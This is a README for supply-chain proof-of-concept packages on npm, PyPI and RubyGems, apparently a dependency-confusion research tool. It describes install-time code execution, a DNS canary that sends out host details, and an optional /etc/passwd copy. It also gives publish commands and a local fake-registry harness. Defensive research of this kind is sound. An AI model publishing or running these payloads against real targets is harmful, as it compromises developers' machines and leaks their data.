# PoC packages — per-registry, per-category

**For educational use only.** These packages demonstrate supply-chain
execution mechanics for defensive security research and authorized
engagements. Three categories × three registries:

| Category | What it proves | npm | PyPI | RubyGems |
|---|---|---|---|---|
| **dns** | Install/load-time canary: encodes hostname, homedir, cwd into DNS lookups under `POC_DNS_NAMESPACE` (default `dns.supplyshark.io`) so you can see WHO installed the name and WHEN | `preinstall` script | sdist build (setup.py) + first import | `gem install` (extconf.rb) + first `require` |
| **placeholder** | Inert name-holder for coordinated disclosure: no code, researcher-identified, transfer-on-request | — | — | — |
| **rce** | Code execution at the registry's earliest execution point; default payload writes `rce-proof.txt` (`id`/user/cwd/time). `POC_IMPACT=1` additionally copies `/etc/passwd` — authorized targets only | `preinstall` script | sdist build + first import | `gem install` (extconf.rb) + first `require` |

## Registry nuance worth knowing before you write a report

- **npm**: install lifecycle scripts (`preinstall`) run on install; note
  npm ≥11 prints an `install-scripts` approval warning, and hardened
  clients can block scripts — the bin shim still executes on first run.
- **PyPI**: pip executes `setup.py` only when installing an **sdist**
  (build step). Wheels do not execute at install — their module body runs
  on first import. Ship PoCs as sdists; say "import-time" for wheels.
- **RubyGems**: `spec.extensions` (`ext/extconf.rb`) executes on the
  victim machine during `gem install` — nominally the native-build step,
  but it runs arbitrary Ruby, making it the gem equivalent of npm's
  `preinstall`. Gem code additionally runs on first `require`. Both paths
  are wired into the dns and rce PoCs (verified locally: `gem install`
  fires extconf -> payload; require fires the lib payload again). The dns
  canary caps itself at `POC_DNS_TIMEOUT` (5s default) so an unreachable
  namespace can never stall a victim's install.

## npm 12+: which surface fires

npm 12 blocks dependency install scripts by default (allowScripts off
since 12.0; advisory-warned since 11.16). Measured on 11.19 and 12.2:

| Victim action | npm < 12 | npm 12+ | PoC surface used |
|---|---|---|---|
| `npm install <x>` alone | preinstall | blocked | `preinstall` (legacy/allowlisted clients) |
| victim's own scripts invoke the bin | RCE | **RCE** | shebang'd `bin` |
| full install, victim postinstall invokes bin | RCE | **RCE during install** | `bin` |
| `npx <x>` | RCE | **RCE** | `bin` |
| app imports the dep | RCE | **RCE** | module body (`main`) |

One command per path (both client generations):
`scripts/demo_npm_rce.sh <name> <runner|dep|tool|ownscript|global>`.
To serve these real payloads: `cd poc_packages/npm/rce && npm pack`, then
`TARBALL=<path>.tgz scripts/demo_npm_rce.sh <name> <tag>`. Full matrix
and triage decision tree: AGENTS.md "npm exec paths & severity."

## Hard rules

1. NEVER publish any of these to a real registry against a name you are
   not authorized to test. Placeholders may be published defensively only
   as a deliberate, human-approved act during disclosure (rename first,
   put researcher contact in the metadata, offer transfer/removal).
2. `POC_IMPACT=1` exists for demonstrating impact in authorized
   engagements. Leave it off everywhere else.
3. Default payloads are harmless by construction: DNS lookups only
   (dns), a marker file (rce). `POC_NO_AUTORUN=1` disables autorun for
   inspection/importing during development.

## Rename before use

The shipped names (`supplyshark-poc-*`) are synthetic so this directory
carries no research targets. In an authorized engagement, rename the
package (and gem/module names) to the target dangling name, set
`POC_DNS_NAMESPACE` to a namespace you control, and rebuild.

## Build & publish commands (when authorized)

### npm

```bash
cd poc_packages/npm/<category>/
npm pack                       # -> supplyshark-poc-<category>-1.3.37.tgz
npm publish                    # requires npm login; renames first
```

### PyPI (sdist — the form that executes at install)

```bash
cd poc_packages/pypi/<category>/
python3 -m pip install --upgrade build twine
python3 -m build --sdist
python3 -m twine check dist/*
python3 -m twine upload dist/* # requires credentials
```

### RubyGems

```bash
cd poc_packages/gem/<category>/
gem build supplyshark-poc-<category>.gemspec
gem push supplyshark-poc-<category>-1.3.37.gem   # requires credentials
```

## Validating dependency confusion locally (no real registry touched)

`scripts/fake_registry.py` is a local stand-in for all three registries.
It serves ANY name a victim's package manager asks about (generated on
the fly, carrying a harmless marker payload), logs every resolution, and
lets you prove the actual confusion flow — including whether a victim
repo's real install pulls the attacker name — without uploading anything
anywhere.

```bash
# terminal 1 — the "attacker-controlled registry"
python3 scripts/fake_registry.py --port 8080 \
    [--gem-name internal-gem-name ...] --marker-file /tmp/proof.txt
```

Terminal 2 — the victim, per registry (use throwaway dirs):

```bash
# npm: registry override, fresh project
mkdir /tmp/victim && cd /tmp/victim && npm init -y
echo "registry=http://127.0.0.1:8080/" > .npmrc
npm install <dangling-name>
# watch terminal 1 print: [npm ] RESOLVED: <name>

# PyPI: attacker index as THE index (build tools are proxied read-only
# from pypi.org so no client prerequisites are needed)
pip install <dangling-name> --index-url http://127.0.0.1:8080/simple/ \
    --no-deps --target /tmp/victim-py
# setup.py executes during the build -> marker written

# RubyGems: pass the name via --gem-name when starting the server, then
gem install <dangling-name> --clear-sources --source http://127.0.0.1:8080 \
    --install-dir /tmp/victim-gems
# extconf.rb executes at install -> marker written
```

`/tmp/proof.txt` (the marker file) plus the server's `RESOLVED` lines are
the evidence: the victim's package manager fetched and executed (or
delivered) attacker-controlled code.

### Testing registry-priority scenarios against a real victim repo

Copy the victim repo to a scratch dir first (never modify the original),
then run ITS documented install flow pointed at the fake registry:

- **pip priority**: `pip install -r requirements.txt --index-url ...` proves
  full-index control; `--extra-index-url ...` next to the real PyPI shows
  whether the attacker name wins the version race in a mixed setup.
- **npm priority**: drop the `registry=` line into a scratch-copy
  `.npmrc`, or run the repo's own `npm ci/install` with `--registry`.
- **vendored/internal packages** (e.g. `packages/` monorepo dirs): this is
  exactly how you check whether the registry copy takes priority over the
  vendored one in the app's real resolution flow — run the app's actual
  install/build and see if the attacker name gets resolved from the index.

### Client notes worth knowing before writing a report

- **npm 12+** blocks dependency install scripts by default (npm 11.x ran
  them with an advisory). Bin linking, `npx`, import-time execution, and
  `npm run` bin invocation are unaffected — verified on npm 11.19 and
  12.2 with this harness; see AGENTS.md "npm exec paths & severity."
- **pip** executes `setup.py` when installing sdists (build isolation
  downloads build tools from the index — the fake registry proxies those
  read-only from pypi.org; downloads only, nothing is ever published).
- **RubyGems** runs `extconf.rb` at install; gems also execute on first
  `require`.
